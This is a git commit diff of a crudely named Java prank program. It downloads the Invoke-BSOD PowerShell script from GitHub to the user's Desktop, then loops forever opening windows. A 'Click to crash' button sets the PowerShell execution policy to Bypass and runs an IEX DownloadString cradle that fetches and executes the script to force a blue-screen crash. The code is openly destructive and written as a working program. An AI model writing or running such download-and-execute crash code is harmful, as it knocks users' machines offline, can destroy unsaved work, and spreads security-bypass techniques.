6d226dc344b89cd462b3f05e1880fdaaf3ed805a
machinesmith42 <30908256+machinesmith42@users.noreply.github.com>
2021-10-13 19:39:14 -0500

    Update Shit_Shit_Shit_Fuck_Shit.java

--- Shit_Shit_Shit_Fuck_Shit.java
+++ Shit_Shit_Shit_Fuck_Shit.java
@@ -1,13 +1,21 @@
+import com.profesorfalken.jpowershell.PowerShell;
+
 import javax.swing.*;
+import java.awt.event.ActionEvent;
+import java.awt.event.ActionListener;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
+import java.net.MalformedURLException;
 import java.net.URL;
 import java.lang.Math;
-public class Shit_Shit_Shit_Fuck_Shit {
-    public static void copyURLToFile(URL url, File file) {
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
 
+public  class Shit_Shit_Shit_Fuck_Shit implements ActionListener {
+        public static void copyURLToFile(URL url, File file) {
         try {
             InputStream input = url.openStream();
             if (file.exists()) {
@@ -39,64 +47,61 @@ public class Shit_Shit_Shit_Fuck_Shit {
             ioEx.printStackTrace();
         }
 
-        public static void killMe() {
+    }
+        public void killMe() throws IOException {
             JFrame meep = new JFrame("Click here to crash");
             meep.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
             meep.setSize(300, 300);
             JButton boom = new JButton("Click to crash");
             meep.getContentPane().add(boom);
             meep.setVisible(true);
-            boom.addActionListener(new ActionListener() {
-                public void actionPerformed(ActionEvent e) {
-                    String command = "powershell.exe " + System.getProperty("user.home") + "/Desktop/Invoke-BSOD.ps1";
-                    // Executing the command
-                    Process powerShellProcess = Runtime.getRuntime().exec(command);
-                    // Getting the results
-                    powerShellProcess.getOutputStream().close();
-                    String line;
-                    System.out.println("Standard Output:");
-                    BufferedReader stdout = new BufferedReader(new InputStreamReader(
-                        powerShellProcess.getInputStream()));
-                    while ((line = stdout.readLine()) != null) {
-                        System.out.println(line);
-                    }
-                    stdout.close();
-                    System.out.println("Standard Error:");
-                    BufferedReader stderr = new BufferedReader(new InputStreamReader(
-                        powerShellProcess.getErrorStream()));
-                    while ((line = stderr.readLine()) != null) {
-                        System.out.println(line);
-                    }
-
-                    stderr.close();
-                    System.out.println("Done");
-
-                }
-            });
+            boom.addActionListener(this);
         }
+        public void actionPerformed(ActionEvent ev) {
+                String command = "cmd /c powershell -ExecutionPolicy Unrestricted -noprofile "  + System.getProperty("user.home") + "/Desktop/Invoke-BSOD.ps1";
+                // Executing the command
+            PowerShell powerShell = PowerShell.openSession();
+            powerShell.executeCommand("Set-ExecutionPolicy Bypass -Scope CurrentUser");
+            powerShell.executeCommand("IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD\n");
+            //Print results
+            powerShell.close();
 
-        public static void main(String args[]) {
+        }
+        public void init(){
             String sUrl = "https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1";
 
-            URL url = new URL(sUrl);
+            URL url = null;
+            try {
+                url = new URL(sUrl);
+            } catch (MalformedURLException e) {
+                e.printStackTrace();
+            }
             int kill = 0;
             //File where to be downloaded
             File file = new File(System.getProperty("user.home") + "/Desktop/Invoke-BSOD.ps1");
 
-            URLReader.copyURLToFile(url, file);
+            copyURLToFile(url, file);
             while (true) { //why
-                /*JFrame death = new JFrame("haha yes");
+                JFrame death = new JFrame("haha yes");
                 death.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
                 death.setSize(300, 300);
                 JButton weewoo = new JButton("Click to die instantly");
                 death.getContentPane().add(weewoo);
-                death.setVisible(true);*/
-                kill = Math.random() * 1000;
+                death.setVisible(true);
+                kill = (int)(Math.random() * 1000);
                 if (kill == 69 || kill == 420) {
-                    killMe();
+                    try {
+                        killMe();
+                    } catch (IOException e) {
+                        e.printStackTrace();
+                    }
                 }
 
             }
+        }
+        public static void main(String args[]) {
+            Shit_Shit_Shit_Fuck_Shit chaos = new Shit_Shit_Shit_Fuck_Shit();
+            chaos.init();
             //don't do this
         }
     }
